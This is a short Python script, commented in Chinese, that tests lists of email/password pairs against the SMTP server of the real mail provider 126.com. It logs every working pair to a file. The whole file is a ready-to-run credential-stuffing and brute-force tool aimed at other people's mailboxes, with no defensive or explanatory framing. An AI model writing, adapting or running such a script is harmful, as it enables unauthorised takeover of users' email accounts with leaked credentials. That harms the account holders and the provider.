import smtplib
import time
mail =[]
smtp_server = 'smtp.126.com'
server = smtplib.SMTP(smtp_server)




## 等待爆破的账号密码
with open('126.txt','r') as f:
    for line in f.readlines():
        mail.append(line.strip('\n'))

# 循环取邮箱smtp登录
for all in mail:
    server = smtplib.SMTP(smtp_server)
    user_all = all.split('\t')
    email = user_all[0]  #账号
    password = user_all[1] # 密码
    try:

        server.login(email,password)




    except Exception as error:
        time.sleep(1)
        print("[-] Login failed  %s : %s" % (email,password),error)
    else:
        print("[+] Login successful %s : %s  " % (email,password))
        with open('successful_126.txt','a+',encoding='UTF-8') as w:
            w.write(email +'\t' + password + '\n')
    finally:
        server.quit()
